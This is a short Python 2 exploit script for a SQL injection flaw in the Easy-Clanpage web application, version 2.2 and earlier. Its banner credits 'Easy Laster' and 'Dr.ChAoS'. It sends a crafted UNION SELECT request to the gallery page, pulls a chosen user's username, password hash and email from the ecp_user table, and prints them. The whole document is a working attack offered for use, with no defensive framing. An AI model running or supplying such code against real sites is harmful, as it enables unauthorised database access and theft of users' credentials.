#Exploit
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import sys, urllib2, re
 
if len(sys.argv) < 2:
    print "***************************************************************"
    print "*************** Easy-Clanpage v2.2 Gallery Hack ***************"
    print "***************************************************************"
    print "*         Discovered and vulnerability by Easy Laster         *"      
    print "*         Easy-Clanpage <= v2.2 SQL Injection Exploit         *"
    print "*                      coded by Dr.ChAoS                      *"
    print "*                                                             *"
    print "* Usage:                                                      *"
    print "* python exploit.py http://site.de/ecp/ <userid, default=1>   *"
    print "*                                                             *"
    print "***************************************************************"
    exit()
 
if len(sys.argv) < 3:
    id = 1
else:
    id = sys.argv[2]
 
site = sys.argv[1]
if site[-1:] != "/":
    site += "/"
 
url = site + "index.php?section=gallery&action=gallery&id=-1111111111+union+select+1,2,concat(0x23,0x23,0x23,0x23,0x23,username,0x3a,password,0x3a,email,0x23,0x23,0x23,0x23,0x23),4+from+ecp_user+where+userID=" + str(id) + "--"
 
print "Exploiting..."
 
html = urllib2.urlopen(url).read()
# I hate regex!
data = re.findall(r"#####(.*)\:([0-9a-fA-F]{32})\:(.*)#####", html)
if len(data) > 0:
    print "Success!\n"
    print "ID: " + str(id)
    print "Username: " + data[0][0]
    print "Password: " + data[0][1]
    print "E-Mail: " + data[0][2]
    print "\nHave a nice day!"
else:
    print "Exploit failed..."